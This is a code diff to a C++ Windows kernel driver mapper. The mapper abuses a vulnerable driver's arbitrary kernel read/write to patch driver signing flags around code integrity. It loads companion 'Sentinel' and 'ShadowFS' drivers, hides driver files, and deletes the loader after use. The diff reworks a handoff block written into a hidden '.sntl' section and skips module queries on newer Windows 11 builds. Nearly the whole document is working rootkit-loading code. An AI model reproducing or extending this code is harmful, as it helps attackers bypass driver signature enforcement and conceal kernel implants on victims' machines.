@@ -1,6 +1,7 @@
 
 #include "Mapper.h"
 #include "EmbeddedDriver.h"
+#include "../../driver/sentinel_handoff.h"
 #include <Shlwapi.h>
 #include <cstdio>
 #include <cstdarg>
@@ -77,6 +78,8 @@ static ULONG MapperBuildNumber()
 {
     return *reinterpret_cast<volatile ULONG*>(static_cast<ULONG_PTR>(0x7FFE0260)) & 0xFFFFu;
 }
+
+static bool g_LastTriggerDeferredSentinelLiveQueries = false;
 
 static void MapperFileNameAnsi(PCWSTR path, char* out, size_t out_count)
 {
@@ -340,50 +343,52 @@ static BOOL PreseedSentinelFileHandoff(PCWSTR sentinelPath, PVOID whoswhoBase, U
     }
 
     ULONGLONG rawOffset = sntl->PointerToRawData;
-    ULONGLONG rawSize = sntl->SizeOfRawData ? sntl->SizeOfRawData : sntl->Misc.VirtualSize;
-    if (rawOffset == 0 || rawSize < 0x14 || rawOffset + 0x14 > static_cast<ULONGLONG>(fileSize.QuadPart)) {
+    ULONGLONG rawSize = sntl->SizeOfRawData;
+    ULONGLONG fileBytes = static_cast<ULONGLONG>(fileSize.QuadPart);
+    if (rawOffset == 0 || rawSize < sizeof(aida_sentinel_handoff_block) ||
+        rawOffset > fileBytes || rawSize > fileBytes - rawOffset) {
         return fail_close("sntl_bounds", static_cast<DWORD>(rawOffset));
     }
 
-    UCHAR handoff[0x14] = {};
+    aida_sentinel_handoff_block handoff = {};
     PVOID objectValue = nullptr;
-    memcpy(handoff, &whoswhoBase, sizeof(whoswhoBase));
-    memcpy(handoff + 0x8, &objectValue, sizeof(objectValue));
-    memcpy(handoff + 0x10, &whoswhoSize, sizeof(whoswhoSize));
+    aida_sentinel_handoff_prepare(&handoff, whoswhoBase, objectValue, whoswhoSize);
 
     pos.QuadPart = static_cast<LONGLONG>(rawOffset);
     bytes = 0;
+    const DWORD handoffBytes = static_cast<DWORD>(sizeof(handoff));
     if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
-        !WriteFile(file, handoff, sizeof(handoff), &bytes, nullptr) ||
-        bytes != sizeof(handoff)) {
+        !WriteFile(file, &handoff, handoffBytes, &bytes, nullptr) ||
+        bytes != handoffBytes) {
         return fail_close("handoff_write", GetLastError());
     }
 
     FlushFileBuffers(file);
 
-    UCHAR verifyBytes[0x14] = {};
+    aida_sentinel_handoff_block verifyBlock = {};
     pos.QuadPart = static_cast<LONGLONG>(rawOffset);
     bytes = 0;
     if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
-        !ReadFile(file, verifyBytes, sizeof(verifyBytes), &bytes, nullptr) ||
-        bytes != sizeof(verifyBytes)) {
+        !ReadFile(file, &verifyBlock, handoffBytes, &bytes, nullptr) ||
+        bytes != handoffBytes) {
         return fail_close("handoff_verify_read", GetLastError());
     }
 
-    PVOID verifyBase = nullptr;
-    PVOID verifyObject = nullptr;
-    ULONG verifySize = 0;
-    memcpy(&verifyBase, verifyBytes, sizeof(verifyBase));
-    memcpy(&verifyObject, verifyBytes + 0x8, sizeof(verifyObject));
-    memcpy(&verifySize, verifyBytes + 0x10, sizeof(verifySize));
-
-    BOOL match = verifyBase == whoswhoBase && verifyObject == nullptr && verifySize == whoswhoSize;
-    LOG("PreseedSentinelFileHandoff verify raw=0x%llX base=%p expected_base=%p object=%p size=0x%X expected_size=0x%X match=%u elapsed_ms=%llu",
+    PVOID verifyBase = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_base));
+    PVOID verifyObject = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_object));
+    BOOL validBlock = aida_sentinel_handoff_valid(&verifyBlock);
+    BOOL match = validBlock && verifyBase == whoswhoBase && verifyObject == nullptr && verifyBlock.target_size == whoswhoSize;
+    LOG("PreseedSentinelFileHandoff verify raw=0x%llX magic=0x%08X version=%u block_size=0x%X checksum=0x%08X valid=%u base=%p expected_base=%p object=%p size=0x%X expected_size=0x%X match=%u elapsed_ms=%llu",
         static_cast<unsigned long long>(rawOffset),
+        verifyBlock.magic,
+        verifyBlock.version,
+        verifyBlock.size,
+        verifyBlock.checksum,
+        validBlock ? 1u : 0u,
         verifyBase,
         whoswhoBase,
         verifyObject,
-        verifySize,
+        verifyBlock.target_size,
         whoswhoSize,
         match ? 1u : 0u,
         MapperElapsedMs(start));
@@ -781,6 +786,7 @@ namespace MapperCore {
                             PCWSTR sentinelDriverFullPath, PCWSTR shadowFsDriverFullPath,
                             PCWSTR loaderDriverFullPath) {
         LOG("=== TriggerExploit START ===");
+        g_LastTriggerDeferredSentinelLiveQueries = false;
         const ULONGLONG exploitStartTick = GetTickCount64();
         LOG("TriggerExploit context pid=%lu tid=%lu tick=%llu loader_service=%ls target_service=%ls sentinel_service=%ls shadowfs_service=%ls",
             GetCurrentProcessId(),
@@ -807,6 +813,8 @@ namespace MapperCore {
         PVOID cachedShadowFsBase = nullptr;
         ULONG cachedShadowFsImageSize = 0;
         bool sentinelGlobalsWritten = false;
+        bool sentinelFilePreseeded = false;
+        bool deferSentinelLiveQueries = false;
 
         HANDLE deviceHandle = nullptr;
         const ULONGLONG openStartTick = GetTickCount64();
@@ -957,7 +965,6 @@ namespace MapperCore {
                             LOG("Deferring target driver file hide until after CI restore: %ls", targetDriverFullPath);
                         }
 
-                        bool sentinelFilePreseeded = false;
                         if (NT_SUCCESS(status) && sentinelDriverFullPath && sentinelDriverFullPath[0] &&
                             cachedTargetBase && cachedTargetImageSize) {
                             const ULONGLONG filePreseedStartTick = GetTickCount64();
@@ -998,8 +1005,24 @@ namespace MapperCore {
                                 g_SentinelServicePath,
                                 MapperElapsedMs(sentinelLoadStartTick),
                                 MapperElapsedMs(exploitStartTick));
+                            if (sentStatus == STATUS_IMAGE_ALREADY_LOADED && sentinelFilePreseeded && MapperBuildNumber() >= 26100) {
+                                LOG("FATAL: Sentinel already loaded on build=%lu after verified file preseed; refusing live discovery without init proof status=0x%08X",
+                                    MapperBuildNumber(),
+                                    static_cast<DWORD>(sentStatus));
+                                status = sentStatus;
+                            }
+                            if (NT_SUCCESS(status) && NT_SUCCESS(sentStatus) && sentinelFilePreseeded && MapperBuildNumber() >= 26100) {
+                                deferSentinelLiveQueries = true;
+                                g_LastTriggerDeferredSentinelLiveQueries = true;
+                                sentinelGlobalsWritten = true;
+                                LOG("Post-load Sentinel live module queries deferred build=%lu reason=verified_file_preseed whoswho_base=%p whoswho_size=0x%X elapsed_ms=%llu",
+                                    MapperBuildNumber(),
+                                    cachedTargetBase,
+                                    cachedTargetImageSize,
+                                    MapperElapsedMs(exploitStartTick));
+                            }
                             PVOID sentinelBaseFast = nullptr;
-                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
+                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName && !deferSentinelLiveQueries) {
                                 const ULONGLONG sentinelFastStartTick = GetTickCount64();
                                 LOG("Post-load fast module query (Sentinel) begin status=0x%08X name=%ls elapsed_ms=%llu",
                                     static_cast<DWORD>(sentStatus),
@@ -1019,7 +1042,14 @@ namespace MapperCore {
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFullPath && sentinelDriverFullPath[0]) {
                                 LOG("Deferring sentinel driver file hide until after CI restore: %ls", sentinelDriverFullPath);
                             }
-                            if (NT_SUCCESS(sentStatus) && cachedTargetBase && cachedTargetImageSize && cachedSentinelBase) {
+                            if (NT_SUCCESS(sentStatus) && deferSentinelLiveQueries) {
+                                LOG("WriteSentinelGlobals pre_ci_restore skipped build=%lu reason=verified_file_preseed_no_live_query sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
+                                    MapperBuildNumber(),
+                                    cachedSentinelBase,
+                                    cachedSentinelImageSize,
+                                    cachedTargetBase,
+                                    cachedTargetImageSize);
+                            } else if (NT_SUCCESS(sentStatus) && cachedTargetBase && cachedTargetImageSize && cachedSentinelBase) {
                                 const ULONGLONG preseedStartTick = GetTickCount64();
                                 LOG("WriteSentinelGlobals pre_ci_restore begin sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X elapsed_ms=%llu total_elapsed_ms=%llu",
                                     cachedSentinelBase,
@@ -1044,8 +1074,15 @@ namespace MapperCore {
                                     cachedTargetBase,
                                     cachedTargetImageSize);
                             }
-                            LogKernelModuleSnapshot("after_sentinel_load_post_preseed", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
-                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
+                            if (deferSentinelLiveQueries) {
+                                LOG("after_sentinel_load_post_preseed snapshot skipped build=%lu reason=verified_file_preseed_no_live_query target_base=%p target_size=0x%X",
+                                    MapperBuildNumber(),
+                                    cachedTargetBase,
+                                    cachedTargetImageSize);
+                            } else {
+                                LogKernelModuleSnapshot("after_sentinel_load_post_preseed", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+                            }
+                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName && !deferSentinelLiveQueries) {
                                 ULONG sentinelImageSizeAfterLoad = 0;
                                 PVOID sentinelBaseAfterLoad = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentinelImageSizeAfterLoad);
                                 LOG("Post-load sized module query (Sentinel): status=0x%08X base=%p size=0x%X fast_base=%p elapsed_ms=%llu",
@@ -1079,8 +1116,21 @@ namespace MapperCore {
                                 g_ShadowFsServicePath,
                                 MapperElapsedMs(shadowLoadStartTick),
                                 MapperElapsedMs(exploitStartTick));
-                            LogKernelModuleSnapshot("after_shadowfs_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
-                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
+                            if (deferSentinelLiveQueries) {
+                                LOG("after_shadowfs_load snapshot skipped build=%lu reason=verified_file_preseed_no_live_query shadowfs_status=0x%08X target_base=%p target_size=0x%X",
+                                    MapperBuildNumber(),
+                                    static_cast<DWORD>(shadowFsStatus),
+                                    cachedTargetBase,
+                                    cachedTargetImageSize);
+                            } else {
+                                LogKernelModuleSnapshot("after_shadowfs_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+                            }
+                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName && deferSentinelLiveQueries) {
+                                LOG("Post-load module query (ShadowFS) skipped build=%lu reason=verified_file_preseed_no_live_query status=0x%08X elapsed_ms=%llu",
+                                    MapperBuildNumber(),
+                                    static_cast<DWORD>(shadowFsStatus),
+                                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                            } else if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
                                 cachedShadowFsBase = KernelUtils::GetDriverBaseByName(shadowFsDriverFileName, &cachedShadowFsImageSize);
                                 LOG("Post-load module query (ShadowFS): status=0x%08X base=%p size=0x%X elapsed_ms=%llu",
                                     static_cast<DWORD>(shadowFsStatus),
@@ -1158,14 +1208,26 @@ namespace MapperCore {
                             LOG("PatchDriverSigningFlags (target): %s", patchResult ? "OK" : "FAILED");
 
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
-                                LOG("Patching driver signing flags for sentinel: %ls", sentinelDriverFileName);
-                                patchResult = cachedSentinelBase
-                                    ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedSentinelBase, cachedSentinelImageSize, "Sentinel", FALSE)
-                                    : KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
-                                LOG("PatchDriverSigningFlags (sentinel): %s", patchResult ? "OK" : "FAILED");
+                                if (deferSentinelLiveQueries) {
+                                    LOG("PatchDriverSigningFlags (sentinel) skipped build=%lu reason=win11_driverentry_self_marked_and_file_preseeded cached_base=%p cached_size=0x%X",
+                                        MapperBuildNumber(),
+                                        cachedSentinelBase,
+                                        cachedSentinelImageSize);
+                                } else {
+                                    LOG("Patching driver signing flags for sentinel: %ls", sentinelDriverFileName);
+                                    patchResult = cachedSentinelBase
+                                        ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedSentinelBase, cachedSentinelImageSize, "Sentinel", FALSE)
+                                        : KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
+                                    LOG("PatchDriverSigningFlags (sentinel): %s", patchResult ? "OK" : "FAILED");
+                                }
                             }
 
-                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
+                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName && deferSentinelLiveQueries) {
+                                LOG("PatchDriverSigningFlags (shadowfs) skipped build=%lu reason=verified_file_preseed_no_live_query cached_base=%p cached_size=0x%X",
+                                    MapperBuildNumber(),
+                                    cachedShadowFsBase,
+                                    cachedShadowFsImageSize);
+                            } else if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
                                 LOG("Patching driver signing flags for shadowfs: %ls", shadowFsDriverFileName);
                                 patchResult = cachedShadowFsBase
                                     ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedShadowFsBase, cachedShadowFsImageSize, "ShadowFS", FALSE)
@@ -1190,69 +1252,82 @@ namespace MapperCore {
             LOG("--- WriteSentinelGlobals phase begin elapsed_ms=%llu status=0x%08X ---",
                 static_cast<unsigned long long>(GetTickCount64() - exploitStartTick),
                 static_cast<DWORD>(status));
-            ULONG sentImageSize = 0;
-            LOG("Sentinel base discovery attempt=0 name=%ls elapsed_ms=%llu",
-                sentinelDriverFileName,
-                MapperElapsedMs(exploitStartTick));
-            LogKernelModuleSnapshot("before_sentinel_global_discovery", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
-            PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
-            if (!sentBase && cachedSentinelBase) {
-                sentBase = cachedSentinelBase;
-                sentImageSize = cachedSentinelImageSize;
-                LOG("Sentinel base discovery using cached base=%p size=0x%X elapsed_ms=%llu",
-                    sentBase,
-                    sentImageSize,
+            if (deferSentinelLiveQueries) {
+                sentinelGlobalsWritten = true;
+                if (cachedTargetBase) {
+                    g_DriverLoadAddress = cachedTargetBase;
+                }
+                LOG("WriteSentinelGlobals phase skipped build=%lu reason=verified_file_preseed_no_live_query sentinel_globals_written=%u whoswho_base=%p whoswho_size=0x%X elapsed_ms=%llu",
+                    MapperBuildNumber(),
+                    sentinelGlobalsWritten ? 1u : 0u,
+                    cachedTargetBase,
+                    cachedTargetImageSize,
+                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+            } else {
+                ULONG sentImageSize = 0;
+                LOG("Sentinel base discovery attempt=0 name=%ls elapsed_ms=%llu",
+                    sentinelDriverFileName,
                     MapperElapsedMs(exploitStartTick));
-            }
-            LOG("Sentinel driver base: %p, size: 0x%X elapsed_ms=%llu", sentBase, sentImageSize,
-                static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
-            if (sentBase) {
-                g_SentinelLoadAddress = sentBase;
-                g_SentinelImageSize = sentImageSize;
-                ULONG whoswhoImageSize = 0;
-                LOG("WhosWho base discovery attempt=0 name=%ls elapsed_ms=%llu",
-                    targetDriverFileName,
-                    MapperElapsedMs(exploitStartTick));
-                PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
-                if (!whoswhoBase && cachedTargetBase) {
-                    whoswhoBase = cachedTargetBase;
-                    whoswhoImageSize = cachedTargetImageSize;
-                    LOG("WhosWho base discovery using cached base=%p size=0x%X elapsed_ms=%llu",
-                        whoswhoBase,
-                        whoswhoImageSize,
+                LogKernelModuleSnapshot("before_sentinel_global_discovery", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+                PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
+                if (!sentBase && cachedSentinelBase) {
+                    sentBase = cachedSentinelBase;
+                    sentImageSize = cachedSentinelImageSize;
+                    LOG("Sentinel base discovery using cached base=%p size=0x%X elapsed_ms=%llu",
+                        sentBase,
+                        sentImageSize,
                         MapperElapsedMs(exploitStartTick));
                 }
-                LOG("WhosWho driver base: %p, size: 0x%X elapsed_ms=%llu", whoswhoBase, whoswhoImageSize,
+                LOG("Sentinel driver base: %p, size: 0x%X elapsed_ms=%llu", sentBase, sentImageSize,
                     static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
-                if (whoswhoBase) {
-                    g_DriverLoadAddress = whoswhoBase;
-                    if (sentinelGlobalsWritten) {
-                        LOG("WriteSentinelGlobals post_ci_restore skipped reason=already_preseeded sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
-                            sentBase,
-                            sentImageSize,
+                if (sentBase) {
+                    g_SentinelLoadAddress = sentBase;
+                    g_SentinelImageSize = sentImageSize;
+                    ULONG whoswhoImageSize = 0;
+                    LOG("WhosWho base discovery attempt=0 name=%ls elapsed_ms=%llu",
+                        targetDriverFileName,
+                        MapperElapsedMs(exploitStartTick));
+                    PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
+                    if (!whoswhoBase && cachedTargetBase) {
+                        whoswhoBase = cachedTargetBase;
+                        whoswhoImageSize = cachedTargetImageSize;
+                        LOG("WhosWho base discovery using cached base=%p size=0x%X elapsed_ms=%llu",
                             whoswhoBase,
-                            whoswhoImageSize);
-                    } else if (MapperBuildNumber() >= 26100) {
-                        LOG("WriteSentinelGlobals post_ci_restore skipped build=%lu reason=win11_requires_pre_ci_preseed sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
-                            MapperBuildNumber(),
-                            sentBase,
-                            sentImageSize,
-                            whoswhoBase,
-                            whoswhoImageSize);
-                        status = STATUS_UNSUCCESSFUL;
-                    } else {
-                        BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
-                                                 whoswhoBase, whoswhoImageSize);
-                        LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
-                        if (!wsgResult) {
-                            LOG("WriteSentinelGlobals failed; continuing because Sentinel performs in-driver bridge discovery");
+                            whoswhoImageSize,
+                            MapperElapsedMs(exploitStartTick));
+                    }
+                    LOG("WhosWho driver base: %p, size: 0x%X elapsed_ms=%llu", whoswhoBase, whoswhoImageSize,
+                        static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                    if (whoswhoBase) {
+                        g_DriverLoadAddress = whoswhoBase;
+                        if (sentinelGlobalsWritten) {
+                            LOG("WriteSentinelGlobals post_ci_restore skipped reason=already_preseeded sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
+                                sentBase,
+                                sentImageSize,
+                                whoswhoBase,
+                                whoswhoImageSize);
+                        } else if (MapperBuildNumber() >= 26100) {
+                            LOG("WriteSentinelGlobals post_ci_restore skipped build=%lu reason=win11_requires_pre_ci_preseed sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
+                                MapperBuildNumber(),
+                                sentBase,
+                                sentImageSize,
+                                whoswhoBase,
+                                whoswhoImageSize);
+                            status = STATUS_UNSUCCESSFUL;
+                        } else {
+                            BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
+                                                     whoswhoBase, whoswhoImageSize);
+                            LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
+                            if (!wsgResult) {
+                                LOG("WriteSentinelGlobals failed; continuing because Sentinel performs in-driver bridge discovery");
+                            }
                         }
+                    } else {
+                        LOG("WARNING: Could not find WhosWho driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
                     }
                 } else {
-                    LOG("WARNING: Could not find WhosWho driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
+                    LOG("WARNING: Could not find Sentinel driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
                 }
-            } else {
-                LOG("WARNING: Could not find Sentinel driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
             }
         }
 
@@ -1319,7 +1394,15 @@ namespace MapperCore {
             g_LoaderServicePath,
             MapperElapsedMs(unloadStartTick),
             MapperElapsedMs(exploitStartTick));
-        LogKernelModuleSnapshot("after_loader_unload", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+        if (deferSentinelLiveQueries) {
+            LOG("after_loader_unload snapshot skipped build=%lu reason=verified_file_preseed_no_live_query unload_status=0x%08X target_base=%p target_size=0x%X",
+                MapperBuildNumber(),
+                static_cast<DWORD>(unloadStatus),
+                cachedTargetBase,
+                cachedTargetImageSize);
+        } else {
+            LogKernelModuleSnapshot("after_loader_unload", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+        }
         if (NT_SUCCESS(unloadStatus) && loaderDriverFullPath && loaderDriverFullPath[0]) {
             LOG("Deleting loader driver file immediately after unload: %ls", loaderDriverFullPath);
             const ULONGLONG loaderDeleteStartTick = GetTickCount64();
@@ -1565,7 +1648,14 @@ namespace MapperCore {
             targetFileName ? targetFileName : L"(null)",
             sentinelFileName ? sentinelFileName : L"(null)",
             shadowFsFileName ? shadowFsFileName : L"(null)");
-        LogKernelModuleSnapshot("wind_after_trigger", targetFileName, sentinelFileName, shadowFsFileName);
+        if (g_LastTriggerDeferredSentinelLiveQueries) {
+            LOG("wind_after_trigger snapshot skipped build=%lu reason=verified_file_preseed_no_live_query status=0x%08X target_base=%p",
+                MapperBuildNumber(),
+                static_cast<DWORD>(status),
+                g_DriverLoadAddress);
+        } else {
+            LogKernelModuleSnapshot("wind_after_trigger", targetFileName, sentinelFileName, shadowFsFileName);
+        }
         if (NT_SUCCESS(status)) {
             LOG("Hiding loaded driver file: %ls", driverFullPath);
             const ULONGLONG finalTargetHideStart = GetTickCount64();
@@ -1671,8 +1761,17 @@ namespace MapperCore {
         IMAGE_NT_HEADERS64 ntHeaders = {};
         status = VulnDriver::ReadKernelMemory(device, ntHeaderAddr, &ntHeaders, sizeof(ntHeaders));
         LOG_STATUS("ReadKernelMemory (NT headers)", status);
-        if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
-            LOG("ERROR: Invalid NT headers, Signature=0x%X", ntHeaders.Signature);
+        if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE ||
+            ntHeaders.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+            LOG("ERROR: Invalid NT headers, Signature=0x%X OptionalMagic=0x%X", ntHeaders.Signature, ntHeaders.OptionalHeader.Magic);
+            return FALSE;
+        }
+        ULONG effectiveSentinelImageSize = sentinelImageSize;
+        if (effectiveSentinelImageSize == 0) {
+            effectiveSentinelImageSize = ntHeaders.OptionalHeader.SizeOfImage;
+        }
+        if (effectiveSentinelImageSize == 0 || effectiveSentinelImageSize > 100 * 1024 * 1024) {
+            LOG("ERROR: Invalid Sentinel image size supplied=0x%X optional=0x%X", sentinelImageSize, ntHeaders.OptionalHeader.SizeOfImage);
             return FALSE;
         }
         LOG("NT headers OK, %d sections, SizeOfOptionalHeader=0x%X",
@@ -1703,19 +1802,24 @@ namespace MapperCore {
         for (WORD i = 0; i < numSections; i++) {
             char secName[9] = {};
             memcpy(secName, sections[i].Name, 8);
-            LOG("  Section[%d]: '%s' VA=0x%X VSize=0x%X",
-                i, secName, sections[i].VirtualAddress, sections[i].Misc.VirtualSize);
+            LOG("  Section[%d]: '%s' VA=0x%X VSize=0x%X RawSize=0x%X",
+                i, secName, sections[i].VirtualAddress, sections[i].Misc.VirtualSize, sections[i].SizeOfRawData);
         }
 
 
         PVOID sntlKernelAddr = nullptr;
         ULONG sntlSize = 0;
+        ULONG sntlRva = 0;
         for (WORD i = 0; i < numSections; i++) {
             if (memcmp(sections[i].Name, ".sntl\0\0\0", 8) == 0) {
+                sntlRva = sections[i].VirtualAddress;
                 sntlKernelAddr = reinterpret_cast<PVOID>(
-                    reinterpret_cast<ULONG_PTR>(sentinelBase) + sections[i].VirtualAddress);
+                    reinterpret_cast<ULONG_PTR>(sentinelBase) + sntlRva);
                 sntlSize = sections[i].Misc.VirtualSize;
-                LOG("Found .sntl section at kernel addr %p, size=0x%X", sntlKernelAddr, sntlSize);
+                if (sntlSize < sections[i].SizeOfRawData) {
+                    sntlSize = sections[i].SizeOfRawData;
+                }
+                LOG("Found .sntl section at kernel addr %p, rva=0x%X size=0x%X", sntlKernelAddr, sntlRva, sntlSize);
                 break;
             }
         }
@@ -1725,29 +1829,13 @@ namespace MapperCore {
             return FALSE;
         }
 
-        if (sntlSize < 0x14) {
-            LOG("ERROR: .sntl section too small (0x%X < 0x14)", sntlSize);
+        if (sntlSize < sizeof(aida_sentinel_handoff_block)) {
+            LOG("ERROR: .sntl section too small (0x%X < 0x%X)", sntlSize, static_cast<unsigned>(sizeof(aida_sentinel_handoff_block)));
             return FALSE;
         }
 
-
-        PVOID baseSlotAddr = sntlKernelAddr;
-        LOG("Writing WhosWho base (%p) to .sntl+0x0 (%p)...", whoswhoBase, baseSlotAddr);
-        const ULONGLONG baseWriteStart = GetTickCount64();
-        status = VulnDriver::WriteKernelMemory(device, baseSlotAddr, &whoswhoBase, sizeof(PVOID));
-        LOG_STATUS("WriteKernelMemory (.sntl base slot)", status);
-        PVOID baseVerify = nullptr;
-        NTSTATUS baseVerifyStatus = VulnDriver::ReadKernelMemory(device, baseSlotAddr, &baseVerify, sizeof(PVOID));
-        LOG_STATUS("ReadKernelMemory (.sntl base verify)", baseVerifyStatus);
-        LOG("WriteSentinelGlobals base_verify write_status=0x%08X verify_status=0x%08X slot=%p value=%p expected=%p match=%u elapsed_ms=%llu",
-            (DWORD)status,
-            (DWORD)baseVerifyStatus,
-            baseSlotAddr,
-            baseVerify,
-            whoswhoBase,
-            baseVerify == whoswhoBase ? 1u : 0u,
-            MapperElapsedMs(baseWriteStart));
-        if (!NT_SUCCESS(status) || !NT_SUCCESS(baseVerifyStatus) || baseVerify != whoswhoBase) {
+        if (sntlRva > effectiveSentinelImageSize || sntlSize > effectiveSentinelImageSize - sntlRva) {
+            LOG("ERROR: .sntl section outside Sentinel image rva=0x%X size=0x%X image_size=0x%X", sntlRva, sntlSize, effectiveSentinelImageSize);
             return FALSE;
         }
 
@@ -1757,24 +1845,35 @@ namespace MapperCore {
             return FALSE;
         }
 
-        PVOID sizeSlotAddr = reinterpret_cast<PVOID>(
-            reinterpret_cast<ULONG_PTR>(sntlKernelAddr) + 0x10);
-        LOG("Writing WhosWho size (0x%X) to .sntl+0x10 (%p)...", whoswhoSize, sizeSlotAddr);
-        const ULONGLONG sizeWriteStart = GetTickCount64();
-        status = VulnDriver::WriteKernelMemory(device, sizeSlotAddr, &whoswhoSize, sizeof(ULONG));
-        LOG_STATUS("WriteKernelMemory (.sntl size slot)", status);
-        ULONG sizeVerify = 0;
-        NTSTATUS sizeVerifyStatus = VulnDriver::ReadKernelMemory(device, sizeSlotAddr, &sizeVerify, sizeof(ULONG));
-        LOG_STATUS("ReadKernelMemory (.sntl size verify)", sizeVerifyStatus);
-        LOG("WriteSentinelGlobals size_verify write_status=0x%08X verify_status=0x%08X slot=%p value=0x%X expected=0x%X match=%u elapsed_ms=%llu",
-            (DWORD)status,
-            (DWORD)sizeVerifyStatus,
-            sizeSlotAddr,
-            sizeVerify,
+        aida_sentinel_handoff_block handoff = {};
+        aida_sentinel_handoff_prepare(&handoff, whoswhoBase, nullptr, whoswhoSize);
+        const ULONGLONG handoffWriteStart = GetTickCount64();
+        status = VulnDriver::WriteKernelMemory(device, sntlKernelAddr, &handoff, sizeof(handoff));
+        LOG_STATUS("WriteKernelMemory (.sntl handoff block)", status);
+        aida_sentinel_handoff_block verifyBlock = {};
+        NTSTATUS verifyStatus = VulnDriver::ReadKernelMemory(device, sntlKernelAddr, &verifyBlock, sizeof(verifyBlock));
+        LOG_STATUS("ReadKernelMemory (.sntl handoff verify)", verifyStatus);
+        PVOID verifyBase = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_base));
+        PVOID verifyObject = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_object));
+        BOOL validBlock = aida_sentinel_handoff_valid(&verifyBlock);
+        BOOL match = validBlock && verifyBase == whoswhoBase && verifyObject == nullptr && verifyBlock.target_size == whoswhoSize;
+        LOG("WriteSentinelGlobals handoff_verify write_status=0x%08X verify_status=0x%08X slot=%p magic=0x%08X version=%u block_size=0x%X checksum=0x%08X valid=%u base=%p expected_base=%p object=%p size=0x%X expected_size=0x%X match=%u elapsed_ms=%llu",
+            static_cast<DWORD>(status),
+            static_cast<DWORD>(verifyStatus),
+            sntlKernelAddr,
+            verifyBlock.magic,
+            verifyBlock.version,
+            verifyBlock.size,
+            verifyBlock.checksum,
+            validBlock ? 1u : 0u,
+            verifyBase,
+            whoswhoBase,
+            verifyObject,
+            verifyBlock.target_size,
             whoswhoSize,
-            sizeVerify == whoswhoSize ? 1u : 0u,
-            MapperElapsedMs(sizeWriteStart));
-        if (!NT_SUCCESS(status) || !NT_SUCCESS(sizeVerifyStatus) || sizeVerify != whoswhoSize) {
+            match ? 1u : 0u,
+            MapperElapsedMs(handoffWriteStart));
+        if (!NT_SUCCESS(status) || !NT_SUCCESS(verifyStatus) || !match) {
             return FALSE;
         }
 
